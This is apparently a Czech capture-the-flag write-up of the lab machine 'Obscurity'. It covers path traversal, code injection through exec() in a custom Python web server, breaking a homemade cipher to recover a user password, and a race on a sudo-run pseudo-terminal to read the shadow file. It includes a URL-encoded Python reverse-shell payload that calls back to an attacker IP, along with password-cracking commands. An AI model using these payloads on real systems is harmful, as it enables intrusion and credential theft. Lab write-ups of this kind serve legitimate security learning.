---
layout: post
author: Tomáš Matějíček
title: "Obscurity"
date: 2020-12-22
tags: linux rce ssh sudo python exploit
---
## Úvod a kontext

Obscurity je přesně ten typ stroje, který varuje před spoléháním na „vlastní bezpečnostní řešení“. Veřejně dostupný `BadHTTPServer` je vlastní Python server s code injection chybou. Po prvním footholdu pak slabá oprávnění odhalí vlastní šifrovací skript a password reminder pro `robert`. Root nakonec padne na pseudo-terminál `BetterSSH.py`, který lze zneužít závodem k přečtení `shadow`.

Vzdělávací hodnota stroje leží v tom, že každá část je „domácí“ mechanismus. Žádný z nich není sám o sobě složitý, ale všechny dopadají špatně právě proto, že nahrazují standardní a ověřené komponenty.

## Počáteční průzkum

### `BadHTTPServer` na portu `8080`

Scan ukáže jen SSH a vlastní HTTP službu na `8080/tcp`. Už samotný banner `BadHTTPServer` je silný signál, že nepůjde o běžný framework a že bude stát za to zkusit získat zdrojový kód.
```bash
nmap -p 1-65535 -T4 -A -sC -v $IP
```
```text
22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
8080/tcp open   http-proxy BadHTTPServer
```

Přes path traversal lze z webu rovnou stáhnout serverový skript i aplikační logiku.
```text
curl http://obscurity.htb:8080/..%2fSuperSecureServer.py
curl http://obscurity.htb:8080/..%2fmain.py
```

## Analýza zjištění

### Code injection v `SuperSecureServer.py`

Zdrojový kód hned ukáže chybu: server skládá řetězec `output = 'Document: {}'` a předává ho do `exec()`. Protože do formátovaného řetězce vkládá cestu z URL, stačí payload uzavřít apostrofem a doplnit vlastní Python.
```python
info = "output = 'Document: {}'"
print(exec(info.format(path)))
```

Tím pádem jde rovnou poslat reverzní shell a získat první foothold jako webový uživatel.
```text
curl "http://obscurity.htb:8080/';s%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.10.15.119%22%2C4000%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fbash%22%2C%22-i%22%5D%29%3Ba='"
```

### `SuperSecureCrypt.py` a heslo pro `robert`

Po footholdu jsou na disku čitelné soubory spojené s vlastním šifrováním. `SuperSecureCrypt.py` implementuje jednoduchou opakující se transformaci po znacích, takže když jsou k dispozici plaintext/ciphertext páry, jde klíč snadno odvodit. Výsledkem je klíč `alexandrovich`, kterým lze dešifrovat `Obscurity-passremin.txt` a získat heslo `SecThruObsFTW`.
```text
python3 SuperSecureCrypt.py -d -i Obscurity-passremin.txt -o T.txt -k "alexandrovich"
cat T.txt
=> SecThruObsFTW
```

## Získání přístupu

### SSH jako `robert`

Jakmile je známo heslo, nejrozumnější je opustit křehký webový shell a přepnout se na SSH jako `robert`. Tím vznikne stabilní přístup a možnost normálně pracovat s lokálními soubory.
```bash
ssh robert@obscurity.htb
cat user.txt
```
```text
__CENSORED__
```

## Eskalace oprávnění

### `BetterSSH.py` a závod o `shadow`

`sudo -l` ukáže, že `robert` může jako root spouštět `/usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py`. Nejde o skutečné SSH, ale o vlastní pseudo-terminál, který pracuje se soubory v `/tmp/SSH`. Pokud se podaří dočasné soubory průběžně kopírovat do `/tmp`, v jednu chvíli se v nich objeví obsah `shadow`.
```bash
sudo -l
```
```text
(ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
```

```text
while :; do cp /tmp/SSH/* /tmp/; echo 'Hit CTRL+C'; done
sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
```

Jakmile se podaří získat hash `root`, zbývá ho cracknout a přepnout se na root standardním `su`.
```text
root:$6$riekpK4m$__CENSORED__:18226:0:99999:7
/usr/sbin/john Obscurity-shadow --wordlist=/usr/share/wordlists/rockyou.txt
=> mercedes         (root)

su root
cat root.txt
```
```text
__CENSORED__
```

## Shrnutí klíčových poznatků

- Obscurity padá už na vlastním webserveru, který použil `exec()` nad daty z URL a tím proměnil cestu k souboru v RCE.
- Přechod na `robert` stojí na domácím šifrovacím mechanismu, který vypadal „bezpečně“, ale ve skutečnosti šel snadno prolomit.
- Root část je další příklad toho samého: vlastní nástroj `BetterSSH.py` místo standardního řešení zavedl závod, který vydal `shadow`.

## Co si odnést do praxe

- Vlastní webservery a routery požadavků nejsou zkratka k bezpečnosti. Pokud nahrazují běžný framework, často zopakují staré chyby v horší podobě.
- Domácí kryptografie je téměř vždy slabší než standardní knihovny. Jakmile je algoritmus reverzibilní a klíč lze odvodit z dostupných párů, nejde o ochranu hesla.
- Pseudo-terminály a wrappery běžící pod `sudo` musí být auditované stejně přísně jako shell. Na Obscurity se z „bezpečnějšího SSH“ stal jen jiný způsob, jak vydat root hash.
